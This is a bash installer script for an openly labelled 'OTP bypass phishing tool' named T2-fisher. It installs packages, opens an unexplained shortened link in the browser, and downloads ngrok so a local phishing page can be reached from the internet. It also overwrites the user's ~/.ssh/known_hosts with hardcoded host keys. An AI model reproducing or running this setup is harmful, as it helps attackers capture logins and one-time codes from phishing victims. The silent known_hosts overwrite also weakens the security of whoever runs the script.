#!/bin/bash

banner() {
clear
printf "\e[0m\n" 
printf "\e[0m\e[37m████████ ██████     \e[0m\e[1;33m\e[0m\e[1;32m    ███████ ██ ███████ ██   ██ ███████ ██████\e[0m\n"
printf "\e[0m\e[37m   ██         ██      \e[0m\e[1;33m\e[0m\e[1;32m  ██      ██ ██      ██   ██ ██      ██   ██\e[0m\n"
printf "\e[0m\e[37m   ██     █████  █████\e[0m\e[1;33m\e[0m\e[1;32m  █████   ██ ███████ ███████ █████   ██████\e[0m\n"
printf "\e[0m\e[37m   ██    ██           \e[0m\e[1;33m\e[0m\e[1;32m  ██      ██      ██ ██   ██ ██      ██   ██\e[0m\n"
printf "\e[0m\e[37m   ██    ███████     \e[0m\e[1;33m\e[0m\e[1;32m   ██      ██ ███████ ██   ██ ███████ ██   ██\e[0m\n"
printf "\e[0m\n"
echo""    
  echo -e $'\e[1;33m\e[0m\e[1;33m    ██████████\e[0m'"\e[96m██████████"'\e[1;33m\e[0m\e[1;31m██████████\e[0m' '\e[1;32m\e[0m\e[1;32m OTP BYPASS PHISHING TOOL \e[0m''\e[1;37m\e[0m\e[1;37m [v 2.1] \e[0m'                                       
  echo ""
echo -e $'\e[1;37m\e[0m\e[1;37m    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ >>\e[0m'|lolcat
      echo -e "\e[93m        +_+CODED BY TECHNOCYBER AND HACKERSPUNK+_+"|lolcat     
      echo -e $'\e[1;37m\e[0m\e[1;37m    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ >>\e[0m'|lolcat
}
banner
printf "\e[0m\n"
printf "\e[0m\e[1;97m        |------------[ INSTALLING PACKAGES ]------------|\e[0m\n"
printf "\e[0m\n"
apt-get update
apt-get upgrade -y
apt-get -y install ssh
apt-get -y install curl
apt-get -y install php
apt-get -y install unzip
apt-get -y install openssh-server
apt-get -y install openssh
apt-get -y install figlet
apt-get -y install ruby
gem install lolcat
clear
xdg-open https://bit.ly/3f1AQiK
printf "\e[0m\n"
printf "\e[0m\e[1;97m         |------------[ INSTALLING DEPENDENCIES ]-------------|\e[0m\n"
if [[ -d .htr ]]; then
printf ""
else
mkdir .htr
fi
if [[ -d logs ]]; then
printf ""
else
mkdir logs
fi
if [[ -e Modules.zip ]]; then
unzip -qq Modules.zip
rm Modules.zip
fi
if [[ -e .htr/ngrok ]]; then
printf ""
else
arch=$(uname -a | grep -o 'arm' | head -n1)
arch2=$(uname -a | grep -o 'Android' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
curl -LO https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1
if [[ -e ngrok-stable-linux-arm.zip ]]; then
unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
mv ngrok .htr
rm -rf ngrok-stable-linux-arm.zip
chmod +x .htr/ngrok
else
printf "\n \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;93m Error \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;96m Install Ngrok Manually.\e[0m\n"
exit 1
fi
else
curl -LO https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
if [[ -e ngrok-stable-linux-386.zip ]]; then
unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
mv ngrok .htr
rm -rf ngrok-stable-linux-386.zip
chmod +x .htr/ngrok
else
printf "\n \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;93m Error \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;96m Install Ngrok Manually.\e[0m\n"
exit 1
fi
fi
fi
if [[ -d ~/.ssh ]]; then
printf ""
else
mkdir ~/.ssh
fi
chmod +x T2-fisher
printf "|1|SVjtt9mtL4P/5lsqaielF1pJHvM=|6QmJXxfPd9A5uUaFI1RV2H4brTs= ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC3lJnhW1oCXuAYV9IBdcJA+Vx7AHL5S/ZQvV2fhceOAPgO2kNQZla6xvUwoE4iw8lYu3zoE1KtieCU9yInWOVI6W/wFaT/ETH1tn55T2FVsK/zaxPiHZVJGLPPdEEid0vS2p1JDfc9onZ0pNSHLl1QusIOeMUyZ2bUMMLLgw46KOT9S3s/LmxgoJ3PocVUn5rVXz/Dng7Y8jYNe4IFrZOAUsi7hNBa+OYja6ceefpDvNDEJ1BdhbYfGolBdNA7f+FNl0kfaWru4Cblr843wBe2ckO/sNqgeAMXO/qH+SSgQxUXF2AgAw+TGp3yCIyYoOPvOgvcPsQziJLmDbUuQpnH\n|1|PiraXMKgzzt9DdPRSLAtRvRad0Y=|2W162QXfHJvKKZWIaRyZO6VFWJI= ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC3lJnhW1oCXuAYV9IBdcJA+Vx7AHL5S/ZQvV2fhceOAPgO2kNQZla6xvUwoE4iw8lYu3zoE1KtieCU9yInWOVI6W/wFaT/ETH1tn55T2FVsK/zaxPiHZVJGLPPdEEid0vS2p1JDfc9onZ0pNSHLl1QusIOeMUyZ2bUMMLLgw46KOT9S3s/LmxgoJ3PocVUn5rVXz/Dng7Y8jYNe4IFrZOAUsi7hNBa+OYja6ceefpDvNDEJ1BdhbYfGolBdNA7f+FNl0kfaWru4Cblr843wBe2ckO/sNqgeAMXO/qH+SSgQxUXF2AgAw+TGp3yCIyYoOPvOgvcPsQziJLmDbUuQpnH\n" > ~/.ssh/known_hosts
cd ..
cd $HOME/T2-fisher
